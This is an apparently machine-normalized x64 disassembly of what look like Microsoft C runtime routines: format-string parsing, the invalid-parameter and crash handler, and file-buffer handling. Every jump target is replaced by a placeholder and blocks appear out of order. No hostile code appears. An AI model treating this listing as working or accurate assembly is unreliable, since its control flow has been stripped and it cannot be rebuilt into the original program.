jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
add rsp 0x20
pop rbx
retn
sub_180007844
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_1800077fc
cmp [ rdi ] 0xffffffff
je r-xdata
sub_180007898
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rdi r9
mov rsi r8
mov ebx edx
mov rbp rcx
je r-xdata
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov cl [ rbp ]
mov r8 rdi
mov rdx rsi
dec ebx
call sub_1800077fc
inc rbp
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test ebx ebx
jg r-xdata
call sub_1800075a8
cmp [ rax ] 0x2a
jne r-xdata
mov r8 rdi
mov rdx rsi
mov cl 0x3f
call sub_1800077fc
sub_180007918
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x2c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x68 ] rcx
mov rdi rdx
lea rcx [ rsp + 0x78 ]
mov rdx r8
mov r13 r9
mov [ rsp + 0x60 ] eax
mov r12d eax
mov [ rsp + 0x54 ] eax
mov r14d eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x58 ] eax
mov [ rsp + 0x50 ] eax
call sub_180005710
xor r10d r10d
cmp rbx r10
jne r-xdata
or r15d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_1800075a8
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_180008530
cmp [ rsp + 0x90 ] bl
je r-xdata
cmp rdi r10
je r-xdata
mov rcx rbx
call sub_180009454
lea rdx [ rw-data ]
cmp eax r15d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_1800075a8
xor ebx ebx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
mov [ rsp + 0x20 ] rbx
call sub_180008530
cmp [ rsp + 0x90 ] bl
mov bpl [ rdi ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x44 ] r10d
mov edx r10d
mov [ rsp + 0x98 ] r10
cmp bpl r10b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rsp + 0x2c8 ]
xor rcx rsp
call sub_1800042d0
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r15d
jmp r-xdata
mov rax [ rsp + 0x88 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x90 ] r10b
je r-xdata
mov rbx [ rsp + 0xa8 ]
mov r11d 0x200
cmp eax r15d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x1f4e0 ]
jmp r-xdata
mov eax esi
mov rcx [ rsp + 0x88 ]
and [ rcx + 0xc8 ] 0xfffffffd
lea eax [ rbp - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
mov ecx r10d
movsx rax bpl
movsx ecx [ rax + r9 + 0x17ab0 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x1f4e0 ]
lea rdx [ rsp + 0x78 ]
movzx ecx bpl
mov [ rsp + 0x50 ] r10d
call sub_1800057bc
xor esi esi
cmp eax esi
je r-xdata
sub ecx 0x1
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
movsx edx [ rdx + r9 + 0x17ad0 ]
sar edx 0x4
mov [ rsp + 0x5c ] edx
mov ecx edx
cmp edx r10d
je r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl bpl
call sub_1800077fc
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x68 ]
lea r8 [ rsp + 0x40 ]
mov cl bpl
call sub_1800077fc
mov bpl [ rdi ]
inc rdi
cmp bpl sil
je r-xdata
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x54 ] r10d
mov [ rsp + 0x48 ] r10d
mov r12d r10d
mov r14d r15d
mov [ rsp + 0x50 ] r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
mov esi [ rsp + 0x40 ]
mov edx [ rsp + 0x5c ]
lea r9 [ __dos_header ]
mov r11d 0x200
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
mov [ rax ] 0x16
call sub_180008530
cmp [ rsp + 0x90 ] sil
jmp r-xdata
mov bpl [ rdi ]
cmp bpl r10b
jne r-xdata
cmp bpl 0x20
je r-xdata
sub ecx 0x1
je r-xdata
inc rdi
cmp esi r10d
mov [ rsp + 0xb0 ] rdi
jl r-xdata
je r-xdata
or r12d 0x2
jmp r-xdata
cmp bpl 0x23
je r-xdata
cmp bpl 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
bts r12d 0x7
jmp r-xdata
cmp bpl 0x2b
je r-xdata
mov eax [ rsp + 0x54 ]
lea ecx [ rax + rax * 4 ]
movsx eax bpl
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r13 ]
add r13 0x8
cmp eax r10d
mov [ rsp + 0x54 ] eax
jge r-xdata
mov r14d r10d
jmp r-xdata
sub ecx 0x1
je r-xdata
or r12d 0x1
jmp r-xdata
cmp bpl 0x2d
je r-xdata
or r12d 0x4
neg eax
jmp r-xdata
cmp bpl 0x2a
jne r-xdata
sub ecx 0x1
je r-xdata
or r12d 0x4
jmp r-xdata
cmp bpl 0x30
jne r-xdata
mov [ rsp + 0x54 ] eax
jmp r-xdata
lea ecx [ r14 + r14 * 4 ]
movsx eax bpl
lea r14d [ rax + rcx * 2 - 0x30 ]
jmp r-xdata
mov r14d [ r13 ]
add r13 0x8
cmp r14d r10d
jge r-xdata
cmp bpl 0x49
je r-xdata
cmp ecx 0x1
jne r-xdata
or r12d 0x8
jmp r-xdata
mov r14d r15d
jmp r-xdata
mov al [ rdi ]
bts r12d 0xf
cmp al 0x36
jne r-xdata
cmp bpl 0x68
je r-xdata
movsx eax bpl
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdi + 0x1 ] 0x34
jne r-xdata
or r12d 0x20
jmp r-xdata
cmp bpl 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdi + 0x1 ] 0x32
jne r-xdata
add rdi 0x2
bts r12d 0xf
jmp r-xdata
cmp [ rdi ] 0x6c
jne r-xdata
cmp bpl 0x77
jne r-xdata
cmp [ rsp + 0x58 ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdi 0x2
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
inc rdi
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov rax [ rsp + 0x98 ]
cmp rax r10
je r-xdata
test r12b 0x40
je r-xdata
or r12d 0x40
cmp r14d r10d
lea rbx [ rsp + 0xc0 ]
mov esi r11d
jge r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r13 ]
add r13 0x8
jmp r-xdata
bt r12d 0xc
jae r-xdata
mov [ rsp + 0x70 ] 0x1
add bpl 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov rdi [ rsp + 0xb0 ]
mov rcx rax
call sub_180004690
xor r10d r10d
mov [ rsp + 0x98 ] r10
mov edi [ rsp + 0x48 ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r14d 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r12b 0x40
je r-xdata
add r13 0x8
test r12b 0x20
je r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x4c ]
mov r8 rbp
mov edx edi
call sub_180007898
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x20
call sub_180007844
test r12b 0x1
je r-xdata
mov [ rsp + 0x4c ] 0x2d
jmp r-xdata
cmp r14d r11d
cmovg r14d r11d
cmp r14d 0xa3
jle r-xdata
cmp bpl 0x67
jne r-xdata
mov rax [ r13 ]
mov rcx [ rw-data ]
add r13 0x8
movsx edi bpl
movsxd rsi esi
mov [ rsp + 0xa8 ] rax
call DecodePointer
lea rcx [ rsp + 0x78 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x70 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
lea rcx [ rsp + 0xa8 ]
mov rdx rbx
mov [ rsp + 0x20 ] r14d
call rax
mov edi r12d
xor eax eax
and edi 0x80
je r-xdata
mov rdi [ r13 ]
add r13 0x8
call sub_18000f980
xor r10d r10d
cmp eax r10d
je r-xdata
cmp eax 0x6f
je r-xdata
bt r12d 0xf
jb r-xdata
cmp r8 r10
jge r-xdata
test r12b 0x40
je r-xdata
test r12b 0x40
je r-xdata
add r13 0x8
test r12d 0x810
je r-xdata
bts r12d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x44 ]
xor eax eax
cmp [ rsp + 0x50 ] eax
je r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov [ rsp + 0x4c ] 0x2b
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
lea edi [ r14 + 0x15d ]
movsxd rcx edi
call sub_180006ad0
mov [ rsp + 0x98 ] rax
test rax rax
je r-xdata
mov r14d 0x1
jmp r-xdata
cmp bpl 0x67
jne r-xdata
cmp r14d eax
jne r-xdata
test r12b 0x20
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
cmp r14d r10d
jge r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov r8d [ r13 - 0x8 ]
movsxd r8 [ r13 - 0x8 ]
jmp r-xdata
movzx r8d [ r13 - 0x8 ]
jmp r-xdata
movsx r8 [ r13 - 0x8 ]
jmp r-xdata
mov al [ r13 - 0x8 ]
mov [ rsp + 0x44 ] 0x1
mov [ rsp + 0xc0 ] al
movzx r9d [ r13 - 0x8 ]
lea rdx [ rsp + 0xc0 ]
lea rcx [ rsp + 0x44 ]
mov r8 r11
call sub_18000fba8
xor r10d r10d
cmp eax r10d
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx edi
mov rcx rbx
call sub_180007898
xor r10d r10d
cmp edi eax
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x30
call sub_180007844
mov [ rsp + 0x4c ] 0x20
jmp r-xdata
mov esi [ rsp + 0x54 ]
mov rbp [ rsp + 0x68 ]
sub esi [ rsp + 0x44 ]
sub esi edi
test r12b 0xc
jne r-xdata
mov r14d 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
cmp edi eax
jne r-xdata
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
xor eax eax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x48 ]
bts r12d 0x9
jmp r-xdata
mov r14d 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
and r12d 0xfffffff7
cmp r14d r11d
cmovg r14d r11d
mov r14d 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rsp + 0xc0 ]
jmp r-xdata
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
test r12d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x5c ] r10d
test r12b 0x4
je r-xdata
mov rbp rbx
mov rcx rbx
call sub_18000d180
xor r10d r10d
bts r12d 0x8
inc rbx
mov rcx [ rw-data ]
call DecodePointer
lea rdx [ rsp + 0x78 ]
mov rcx rbx
call rax
mov [ rsp + 0x58 ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x4c ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x4d ] al
jmp r-xdata
mov rbx [ r13 ]
cmp r14d r15d
mov eax r14d
mov ecx 0x7fffffff
cmove eax ecx
add r13 0x8
test r12d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
cmp r8 r10
je r-xdata
mov r15d [ rsp + 0x60 ]
mov rax r8
lea rbx [ rsp + 0x2bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x48 ] ecx
bts r12d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbp
mov edx esi
mov cl 0x20
call sub_180007844
xor r10d r10d
mov rbp [ rsp + 0x68 ]
mov eax r15d
mov [ rsp + 0x40 ] eax
jmp r-xdata
mov edx [ rsp + 0xa0 ]
cmp edx r10d
je r-xdata
bt r12d 0xf
jb r-xdata
cmp rbx r10
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
cmp rbx r10
mov [ rsp + 0x50 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax r15d
lea rax [ rsp + 0x2bf ]
mov r15d 0xffffffff
sub eax ebx
inc rbx
bt r12d 0x9
mov [ rsp + 0x44 ] eax
jae r-xdata
mov rax [ r13 ]
add r13 0x8
cmp rax r10
je r-xdata
cmp eax 0x61
je r-xdata
cmp eax r10d
jl r-xdata
mov r8 [ rsp + 0x68 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x2c0 ]
call sub_180007898
xor r10d r10d
cmp edi r10d
jne r-xdata
cmp eax r10d
jne r-xdata
cmp eax r10d
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx r14d
dec r14d
cmp ecx r10d
jg r-xdata
cmp eax r10d
je r-xdata
mov rbx [ rw-data ]
jmp r-xdata
mov rbx [ rax + 0x8 ]
cmp rbx r10
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rbp ]
lea rdx [ rsp + 0x2c0 ]
lea rcx [ rsp + 0xa0 ]
mov r8d 0x6
dec edi
add rbp 0x2
call sub_18000fba8
xor r10d r10d
cmp eax r10d
jne r-xdata
mov rbp [ rsp + 0x68 ]
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x60 ] eax
mov r9d 0x10
test r12b r12b
jns r-xdata
dec rbx
inc [ rsp + 0x44 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
bt r12d 0xb
movsx eax [ rax ]
jae r-xdata
jmp r-xdata
mov eax [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x44 ] ecx
jmp r-xdata
mov [ rsp + 0x50 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x50 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x44 ] eax
sub_180008408
push rbx
sub rsp 0x5e0
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_180009540
lea r11 [ rsp + 0x70 ]
lea rax [ rsp + 0x110 ]
lea rcx [ rsp + 0x110 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov rbx [ rsp + 0x208 ]
lea rdx [ rsp + 0x40 ]
mov rcx rbx
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
mov rax [ rsp + 0x5e8 ]
mov [ rsp + 0x208 ] rax
lea rax [ rsp + 0x5e8 ]
mov [ rsp + 0x1a8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rsp + 0x110 ]
mov r8 rbx
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000417
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x5e0
pop rbx
retn
test ebx ebx
jne r-xdata
mov rax [ rsp + 0x5e8 ]
mov [ rsp + 0x70 ] 0xc0000417
mov [ rsp + 0x74 ] 0x1
mov [ rsp + 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x2 ]
call sub_18000ed2c
sub_180008530
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call DecodePointer
test rax rax
je r-xdata
mov ecx 0x2
call sub_18000ed2c
mov r11 [ rsp + 0x60 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r11
call sub_180008408
mov r10 [ rsp + 0x60 ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
mov [ rsp + 0x20 ] r10
call rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_1800085b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
mov rdi rdx
mov [ rcx ] rax
mov rcx [ rdx ]
test rcx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
call sub_18000d180
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_180004454
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
mov rsi [ rsp + 0x38 ]
mov [ rbx + 0x10 ] 0x1
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov r8 [ rdi ]
lea rdx [ rsi + 0x1 ]
mov rcx rax
call sub_18000f628
jmp r-xdata
sub_180008648
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rdx
mov rbx rcx
mov [ rcx ] rax
mov eax [ rdx + 0x10 ]
mov [ rcx + 0x10 ] eax
test eax eax
je r-xdata
mov rax [ rdx + 0x8 ]
mov [ rcx + 0x8 ] rax
mov rcx [ rdx + 0x8 ]
test rcx rcx
je r-xdata
and [ rbx + 0x8 ] 0x0
jmp r-xdata
call sub_18000d180
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_180004454
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov r8 [ rdi + 0x8 ]
lea rdx [ rsi + 0x1 ]
mov rcx rax
call sub_18000f628
jmp r-xdata
sub_180008700
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_1800086c8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180004690
sub_180008730
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18000fbbc
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180004690
sub_18000878c
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x60
mov rdi rdx
mov rbx rcx
lea rcx [ rsp + 0x20 ]
lea rdx [ r--data ]
mov r8d 0x40
call sub_1800059c0
lea rdx [ rsp + 0x70 ]
mov rcx rdi
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rdi
call RtlPcToFileHeader
mov r11 rax
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x58 ] rax
test rdi rdi
je r-xdata
mov r8d [ rsp + 0x38 ]
mov edx [ rsp + 0x24 ]
mov ecx [ rsp + 0x20 ]
lea r9 [ rsp + 0x40 ]
call [ RaiseException@IAT ]
mov rbx [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
test [ rdi ] 0x8
mov ecx 0x1994000
je r-xdata
mov eax [ rsp + 0x40 ]
test r11 r11
cmove eax ecx
mov [ rsp + 0x40 ] eax
mov [ rsp + 0x40 ] ecx
jmp r-xdata
sub_180008820
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
xor ebx ebx
lea ecx [ rbx + 0x1 ]
call sub_18000bc50
nop
xor edi edi
mov [ rsp + 0x20 ] edi
test rbx rbx
je r-xdata
movsxd rsi edi
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
mov ecx 0x1
call sub_18000bb50
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
and [ rbx + 0x18 ] 0x8000
and [ rbx + 0x8 ] 0x0
and [ rbx + 0x10 ] 0x0
and [ rbx ] 0x0
and [ rbx + 0x28 ] 0x0
or [ rbx + 0x1c ] 0xffffffff
movsxd rdi edi
mov ecx 0x58
call sub_180006ad0
mov rcx [ rw-data ]
mov [ rcx + rdi * 8 ] rax
mov rcx [ rw-data ]
cmp [ rcx + rdi * 8 ] 0x0
je r-xdata
mov rax [ rax + rsi * 8 ]
test [ rax + 0x18 ] 0x83
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
add rcx 0x30
mov edx 0xfa0
call sub_18000f2a0
test eax eax
jne r-xdata
inc edi
mov [ rsp + 0x20 ] edi
jmp r-xdata
bt [ rax + 0x18 ] 0xf
jb r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rdi * 8 ]
add rcx 0x30
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
mov rbx [ r11 + rdi * 8 ]
and [ rbx + 0x18 ] 0x0
mov rcx [ rw-data ]
mov rcx [ rcx + rdi * 8 ]
call sub_180004690
mov r11 [ rw-data ]
and [ r11 + rdi * 8 ] 0x0
jmp r-xdata
cmp edi [ rw-data ]
jge r-xdata
lea eax [ rdi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + rsi * 8 ]
mov ecx edi
call sub_180005660
mov r11 [ rw-data ]
mov rax [ r11 + rsi * 8 ]
test [ rax + 0x18 ] 0x83
je r-xdata
lea ecx [ rdi + 0x10 ]
call sub_18000bb68
test eax eax
je r-xdata
mov rbx rax
jmp r-xdata
mov rdx rax
mov ecx edi
call sub_1800056e8
jmp r-xdata
sub_180008a04
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_18000f8bc
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_180009454
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_1800092e0
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_180009454
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
dec [ rdi + 0x8 ]
movzx eax [ rcx ]
inc rcx
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_180009454
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
bt [ rdi + 0x18 ] 0xa
jb r-xdata
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_180009454
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_180009454
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov [ rdi + 0x24 ] 0x1000
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_180008b60
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] ecx
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x58
mov r12d 0xfffffffe
movsxd rax ecx
mov ebx r8d
mov [ rsp + 0x34 ] r12d
mov [ rsp + 0x38 ] ebx
cmp eax r12d
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1800075c8
xor edi edi
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
jmp r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rsi rax
mov r14 rax
lea r9 [ __dos_header ]
sar r14 0x5
and esi 0x1f
mov rcx [ r9 + r14 * 8 + 0x1f4e0 ]
imul rsi rsi 0x58
mov al [ rcx + rsi + 0x8 ]
test al 0x1
je r-xdata
cmp ebx 0x7fffffff
jbe r-xdata
mov ebp edi
cmp ebx edi
je r-xdata
call sub_1800075c8
mov [ rax ] edi
call sub_1800075a8
mov [ rax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
call sub_180008530
add rsp 0x58
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
cmp rdx rdi
je r-xdata
mov r15b [ rcx + rsi + 0x38 ]
mov r8d 0x4
add r15b r15b
sar r15b 0x1
movsx ecx r15b
sub ecx 0x1
je r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
sub ecx 0x1
jne r-xdata
shr ebx 0x1
cmp ebx r8d
cmovb ebx r8d
mov ecx ebx
call sub_180006ad0
mov r13 rax
cmp rax rdi
jne r-xdata
mov r13 rdx
jmp r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
mov ecx [ rsp + 0xa0 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
call sub_18000f6ec
lea r9 [ __dos_header ]
mov r11 rax
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
mov [ rax + rsi + 0x40 ] r11
call sub_1800075a8
mov [ rax ] 0xc
call sub_1800075c8
mov [ rax ] 0x8
jmp r-xdata
mov rax [ r9 + r14 * 8 + 0x1f4e0 ]
mov rdx r13
mov r8d 0xa
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
and ebx 0xfffffffe
mov rcx [ r9 + r14 * 8 + 0x1f4e0 ]
lea r9 [ rsp + 0x30 ]
mov r8d ebx
mov rcx [ rcx + rsi ]
